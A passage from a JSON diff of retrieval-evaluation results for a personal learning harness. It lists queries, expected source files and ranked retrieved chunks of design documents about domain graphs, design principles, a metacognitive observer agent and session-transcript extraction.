model, incoming skills) that exceeds what the\n`Goal` interface holds.\n\n**Session log format.** Frontmatter references arcs by name string and\nconcepts by name string. Domain graphs use concept IDs (slugs). Need\nalignment or a lookup path.\n\n**No domain graph exists yet.** The branch has the generation skill\n(`domain-map`) and the migration script, but no actual domain graph has\nbeen produced. The migration script needs a domain graph as input to\nmap legacy concepts onto.\n\n---\n\n## Update sequence\n\nEight phases. Each phase produces a testable, internally consistent\nstate. Phases 1-3 are infrastru",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7503522408678609,
+            "source": ".claude/references/developmental-model.md",
+            "section": "chars 0-2000",
+            "text": "# Developmental Model\n\nReference for analyzing a learner's development. Consulted during\nintake (background analysis, interview calibration), session review\n(scoring context), and startwork (priority computation).\n\nThis is system knowledge — it does not change per user.\n\n---\n\n## Two development dimensions\n\nEvery skill develops along two semi-independent dimensions:\n\n**Complexity level (top-down).** What order of abstraction the learner\ncan bring to bear. Higher complexity enables recognition of structural\nisomorphisms across domains — the bridge phenomenon. A skill becomes\n*functional* at one complexity level and *generative* (producing bridges\nto other domains) at a higher level.\n\n**Chunking depth (bottom-up).** How fluent the learner's domain-specific\npattern recognition is. Built through reps. Letters → words → sentences.\nIndividual chess positions → familiar configurations → whole game states.\nuseState calls → component patterns → architectural patterns. Chunking\nbinds frequently co-occurring patterns into single recognizable units.\nThis is what gives experts their \"at a glance\" quality.\n\nThese interact but don't substitute for each other:\n\n| Complexity | Chunking | State | Move |\n|---|---|---|---|\n| High | Low | Correct shape, wrong boundary | Reps — bridge is built, chunks need to wire |\n| Low | Low | Unfamiliar territory | Bridge first, then reps |\n| Low | High | Learned the handshake | Fine as-is; invest complexity only if domain warrants it |\n| High | High | Fluent and generative | Bridge-ready material for other domains |\n\nThe gap between complexity and chunking for a given skill is diagnostic:\nit tells you whether the next move is reps or abstraction.\n\n---\n\n## Three dependency types\n\n**Hard prerequisites.** X genuinely requires Y. Stable across learners.\nHandled by ordering within a capability cluster.\n\n**Bridge dependencies.** X is dramatically easier given Y from another\ndomain. Complexity-gated — visible only at a sufficient complexity\nlevel. Learner-s",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.745341364186501,
+            "source": "design/2026-03-07-domain-graph-integration-plan.md",
+            "section": "chars 0-2000",
+            "text": "# Domain Graph Integration Plan\n\n**Date:** 2026-03-07\n**Status:** Ready for build\n**Branch:** `hart/domain-graph-schema` (PR #15, open, not merged)\n**Constraint:** All updates ship together. Main branch stays on the old\nschema until every skill reads/writes the new format correctly.\n\n---\n\n## Context\n\nThe `hart/domain-graph-schema` branch introduces a two-file architecture\nfor learning state:\n\n- **Domain graph** (`domains/<slug>.domain.json`) — topology, shared,\n  learner-independent. Concepts, prerequisite edges, arcs, complexity\n  ranges, knowing profiles.\n- **Learner state** (`learning/state/<slug>.state.json`) — observations,\n  per-learner, per-domain. Scores, gaps, chunking state, assessment\n  history, bridges, goals.\n\nThey join on concept ID. The domain graph says \"concept X requires\nconcept Y at level 3.\" The learner state says \"this learner is at\nlevel 4 on Y and level 2 on X.\"\n\n**Concept identity:** Domain graphs key concepts by slug ID (e.g.,\n`react-hooks`, `async-execution-model`). The migration script generates\nslugs from legacy concept names via lowercasing and hyphenation. The\n`ConceptNode.name` field preserves the human-readable name. Skills\ndoing concept matching should check both the key (ID) and the `name`\nfield.\n\n**File locations:**\n\n- Harness code (skills, scripts, references): `<harness-root>/`\n  (weft repo)\n- Learner data (current-state, session logs, learner state JSON):\n  `<learner-root>/learning/` (per-learner repo, e.g. roger)\n- Domain graphs: `<harness-root>/domains/` (shared, shipped with\n  harness)\n- Learner state overlays: `<learner-root>/learning/state/`\n  (per-learner)\n\nPath resolution: skills read `~/.config/weft/root` for harness root.\nLearner data paths resolve from CLAUDE.md path mappings.\n\n**What exists on the branch:**\n\n| Artifact | Status |\n|----------|--------|\n| `scripts/types/domain-graph.ts` | Complete (77 lines) |\n| `scripts/types/learner-state.ts` | Complete (57 lines) |\n| `scripts/lib/graph-queries.ts` | Complete (476 lin",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r9-principles",
+        "query": "Design principles update — adding relationship as primary principle alongside awareness and attention",
+        "context": "User revising design principles to add relationship as a core principle.",
+        "expectedSources": [
+          "design/design-principles.md",
+          "design/teaching-principles.md",
+          "notepad/009"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7792629564243307,
+            "source": "design/design-principles.md",
+            "section": "chars 0-2000",
+            "text": "# Design Principles\n\n**Status:** Extracted from `harness-features.md`. Single source of truth\nfor principles governing harness design and learning curriculum.\n\n---\n\n## Role of principles\n\nThese principles govern the harness — the generalizable infrastructure\nunderneath Roger. They organize two catch basins:\n\n- **Harness features** (`design/harness-features.md`) — what to build\n- **Goals** (per-user; e.g. `goals.md`) — what to learn\n\nBoth serve the same goals. Features build the system; skills build the\nperson using it. The principles ensure both are well-aimed.\n\n---\n\n## Boundary conditions\n\nThese scope the entire system. They are not principles to optimize for\nbut limits to design within.\n\n### The system supplements human learning in relationship — it does not replace it\n\nThe agent can compound competence and to some degree bolster confidence, but cannot supply belonging. The felt\nsense of being witnessed in one's growth — the nervous system\nregulation, the mirror neurons, the implicit social signals that say\n\"you're changing and we can see it\" — requires a human. What's more,\nthe wisdom to guide development through a landscape of uncomputable\nproblems is an indispensable human trait, and a rare one at that.\n\nThis means the harness has a relational ceiling when operating solo. A\nstudent using it alone will develop competence faster, but they'll be\nmissing the nutrient that makes competence feel emotionally real – and\nthe leadership that ensures they're moving in a sound direction. A\nsystem that doesn't acknowledge this ceiling risks producing competent\npeople who don't feel competent, or confident people who go nowhere.\n\nThe harness is therefore a supplement: it makes human learning\nrelationships more fruitful. It handles what benefits from infinite\npatience, instant availability, and detailed state tracking — practice,\ncalibration, crystallization, project scaffolding — freeing human\nrelationships for what requires actual human presence: belonging,\nreflection, true",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7451755298968841,
+            "source": "design/harness-features.md",
+            "section": "chars 0-2000",
+            "text": "# Harness Features — Design Principles → Implementation\n\n**Status:** Draft. Catching and sorting.\n\n---\n\n## What this document is\n\nA living registry of harness features, organized by the design principles\nthey serve. Features flow downward: principle → design requirement → harness\nimplementation. New features get caught here first, sorted by which principle\nthey serve, then graduate into design docs when they're ready to build.\n\nThe harness is the generalizable infrastructure underneath any personal\ninstance (Roger is one). The harness is the shape of the container.\n\n**Principles are defined in `design/design-principles.md`.** This document\nsummarizes each principle briefly and tracks the features that serve it.\nSee the principles doc for full definitions, the boundary conditions, and\nthe primary/serving layer hierarchy.\n\n---\n\n### P1. Awareness is the ground\n\nThe field within which all experience occurs. The system stewards what\nit cannot possess. See `design/design-principles.md` §1.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency — protects the human's\n  self-directed awareness)\n- Experiment-first loop (user tries, observes, then asks — preserves\n  the natural rhythm of awareness and attention)\n- Emotional reflection skill (mirrors awareness state without attempting\n  to fix it; knows its boundary)\n- Watch-for items in CLAUDE.md (authority shadow, confidence gap — patterns\n  that fragment awareness when activated)\n- Tutor posture: Socratic method preserves the learner's active\n  engagement rather than inducing the passivity that narrows awareness\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Emotional reflection skill | Deferred | Behavior embedded in Tutor personality; standalone skill not built. Mirrors awareness state; knows its boundary with somatic/attachment work |\n| Watch-for pattern recognition | Built | CLAUDE.md flags patterns that fragment awareness |\n| Experiment-first loop protectio",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.744244355025636,
+            "source": "notepad/009-metaclaude-conscience.md",
+            "section": "chars 0-2000",
+            "text": "# MetaClaude's Conscience: Design Principles as Alignment\n\n## The idea\n\nGive MetaClaude the design principles — not as rules to enforce,\nbut as a perceptual frame. MetaClaude doesn't just observe whether\nBuilder Claude is on-task. It observes whether the session is\nserving awareness, attention, and relationship.\n\n## What changes\n\nWithout the principles, MetaClaude is a project manager: \"you\ndrifted from the goal,\" \"you're circling,\" \"use the notepad.\"\nUseful but shallow.\n\nWith the principles, MetaClaude becomes something closer to what\nthe principles describe the system as: a steward of the human's\nawareness that compounds attention and serves relationship.\n\nConcrete difference in observations:\n\n**Without principles:**\n\"Builder Claude has been implementing for 20 minutes without\nchecking whether the user understands the code.\"\n\n**With principles:**\n\"The last three turns produced Claude-authored code the user\nhasn't engaged with. P1: the user's time is being spent but\nawareness may not be tracking. The code entered the project\nwithout the learning.\"\n\nThe second observation connects to something in the CLAUDE.md\nprofile: \"Claude-authored code as unexamined dependency.\" The\nprinciples give MetaClaude the frame to recognize this pattern\nas a first-class concern, not just a productivity note.\n\n## Which principles matter most for MetaClaude\n\nNot all 10 are equally relevant to a metacognitive observer.\nThe ones that do real work:\n\n**P1 (Awareness is the ground)** — MetaClaude's primary lens.\nIs the session serving the human's awareness or fragmenting it?\nIs difficulty well-aimed? Is time being spent where it compounds?\n\n**P2 (Attention is the directed faculty)** — Is Builder Claude's\ncontext well-composed? Is the user's attention on the right\nthing? Has the session drifted in altitude?\n\n**P5 (Intervention matches the gap)** — Is Builder Claude\nexplaining when it should be giving reps? Demonstrating when it\nshould be questioning? This is directly observable from the\ntranscr",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r10-extraction",
+        "query": "Building conversation extraction script for session transcripts — parsing tool use, error codes, and learning signals from JSONL logs",
+        "context": "User building a script to parse Claude Code conversation transcripts for learning signals.",
+        "expectedSources": [
+          "design/2026-03-09-metaclaude-local-prd.md",
+          "design/complete/improvement-plan.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7148954195323426,
+            "source": "design/complete/improvement-plan.md",
+            "section": "chars 11900-13695",
+            "text": "it + conversation | noted for developer\"\n```\n\nThis surfaces installation gaps and unexpected mismatches between the\nsession-discovery record and the session-log record.\n\n### B3. Line budget\n\nCount lines after edits. If SKILL.md exceeds 500 lines, extract the\nsub-agent dispatch instructions (the structured return format in B1 step\n3c) to `session-review/subagents.md` and reference it from Phase 1.\nSame pattern as intake uses for sub-agent prompts.\n\n---\n\n## Implementation sequence\n\n1. **Phase A first** — session-review can't invoke the script until it\n   ships in production\n2. Update session-discovery SKILL.md path (A2 first sub-step)\n3. Copy `scripts/session-discovery.ts` from weft-dev to production weft (A1)\n4. Copy `.claude/skills/session-discovery/` from weft-dev to production\n   weft (A2)\n5. Commit and push production weft (A3)\n6. Confirm hook change is present (A4 verify step)\n7. Test via weftclone — pull, run script, test hook detection, restore\n   symlink (A5a–d)\n8. Read current `session-review/SKILL.md` in full — confirm exact lines\n   being replaced (Phase 1 steps 3 and 4)\n9. Replace Phase 1 step 3 with the new 3a–3e pipeline, absorbing step 4 (B1)\n10. Add session-discovery category to Phase 4 agent observations (B2)\n11. Count lines — verify under 500; extract to subagents.md if over (B3)\n\n## Verification\n\n1. Read SKILL.md end-to-end for coherence as a standalone document\n2. Context management gate: three concrete tiers with numbers, not\n   subjective assessment\n3. Sub-agent prompt spec: complete enough to follow without guessing\n4. Script path uses `$(cat ~/.config/weft/root)` — no hardcoded paths\n5. Session logs correctly positioned as deduplication-only, not primary\n   evidence\n6. Phase 4 signal includes session-discovery category\n7. Line count under 500",
+            "charCount": 1795
+          },
+          {
+            "rank": 2,
+            "score": 0.7124579113614153,
+            "source": "design/complete/session-digest-plan.md",
+            "section": "chars 5100-7100",
+            "text": "all sessions since\n   intake. Ask user to confirm before proceeding (they may want to\n   narrow the window — especially relevant for large first-run windows).\n\n#### Phase 2: Extract\n\nContext management gate (same thresholds as session-review):\n\n| Manifest data | Strategy |\n|---|---|\n| 0-1 sessions AND total messageCount < 200 | Inline: read JSONL(s) directly |\n| 2-3 sessions OR total messageCount 200-500 | Single sub-agent with all JSONL paths |\n| 4+ sessions OR total messageCount > 500 | Parallel sub-agents — one per session JSONL |\n\nEach reader (inline or sub-agent) receives:\n- The JSONL file path\n- Current `learning/current-state.md` (so it knows existing concepts/scores)\n- Instructions to extract:\n\n```\nconcepts_encountered:\n  - concept: [name — match existing current-state names when possible]\n    evidence: [specific quote, paraphrase, or behavioral description]\n    signal_type: new_exposure | struggle | breakthrough | teaching | deepening\n    estimated_score: [0-5, or null if uncertain]\n    gap_type: [conceptual | procedural | recall, or null]\n    confidence: [high | moderate | low]\n\nprocedural_observations:\n  - [workflow patterns, tool usage, debugging approach — brief]\n```\n\nSub-agent filtering instructions (same noise patterns as session-review):\n- Filter to `user` and `assistant` message types only\n- Skip blocks starting with: `<ide_opened_file>`, `<system-reminder>`,\n  `<command-message>`, `<command-name>`, `<local-command`\n- Focus on: error debugging, user explanations, new concepts introduced,\n  code written/reviewed, design decisions articulated\n- Skip: pure orchestration (\"commit push merge\"), file listing, routine\n  tool calls\n\n#### Phase 3: Synthesize\n\nLoad current-state.md. Compare extracted concepts against current state.\nBuild a proposed diff with four sections:\n\n**A. Score changes** (existing concepts with new evidence)\n- Show: concept name, current score → proposed score, evidence, reasoning\n- Only propose changes when evidence is strong enough (",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6974072077807869,
+            "source": "design/2026-03-09-metaclaude-local-prd.md",
+            "section": "chars 28900-30900",
+            "text": "el payload (with source paths)\n\n**Brainstorm:** Silent failure detection. Session logs capture tool calls with exit codes and empty outputs — enough data to surface recurring failures that get routed around by graceful degradation (e.g., `bun run` silently failing on absolute paths, causing skills to skip session data entirely). A periodic diagnostic that scans recent session logs for non-zero exits, empty-where-non-empty-expected, and repeated error patterns could catch these before they compound. Design as part of a dev-mode toolkit.\n\n**Curriculum alignment:** Embedding models, vector storage, RAG\npipeline construction.\n\n### Phase 3: Observability (Day 2-3) — COMPLETE + extended\n\nBuilt ahead of schedule during design session. Extended with structured\nsession logging and inline chat display (2026-03-09).\n\n- [x] Injection log file: daily JSONL with timestamp, content,\n      latency, mode. In `~/.claude/metaclaude/logs/`.\n- [x] Dev mode: multi-line status line shows injection content\n      (\"injected: ...\") and staged content (\"staged: ...\").\n- [x] Production mode: status line indicator only (`○ MC` / `◉ MC`).\n- [x] Mode switching: `toggle.sh --dev / --prod / mode dev / mode prod`\n- [x] Dev mode inline chat display: additionalContext content shown\n      in chat via stderr with `◉ MC` heading in bright magenta,\n      matching the status line icon. (`inject.sh`)\n- [x] Structured per-session logging: JSONL per conversation in\n      `weft-dev/meta/`, capturing full observation pipeline (see\n      \"Session logging\" section below). (`observer.sh` + `inject.sh`)\n- [x] Log viewer: promoted to Phase 3a (see below). Built and later removed.\n\n### Phase 3a: Session Log Viewer (removed)\n\nWas a React SPA + Bun HTTP server in `tools/log-viewer/`. Built during\ninitial implementation, later removed from the repo. Session logs are\ndirectly queryable with `jq` (see Session logging section). A viewer\nmay be rebuilt if needed.\n\n### Phase 2.5: Fine-tune meta-agent (after Phase 2 is battle",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 5795
+      }
+    ]
+  }
+]
